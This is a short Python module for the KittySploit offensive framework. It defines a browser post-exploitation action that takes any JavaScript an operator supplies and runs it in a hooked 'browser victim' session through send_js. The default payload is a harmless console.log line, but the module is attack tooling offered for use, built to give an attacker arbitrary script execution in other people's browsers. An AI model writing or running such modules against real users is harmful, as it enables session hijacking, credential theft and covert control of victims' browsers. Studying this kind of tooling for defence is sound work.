from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Execute JavaScript",
		"description": "Execute JavaScript code on browser victim",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	
	
	code = OptString("console.log('Hello from KittySploit!');", "JavaScript code to execute", True)

	def run(self):
		"""Execute JavaScript code on the target browser session"""
		return self.send_js(self.code)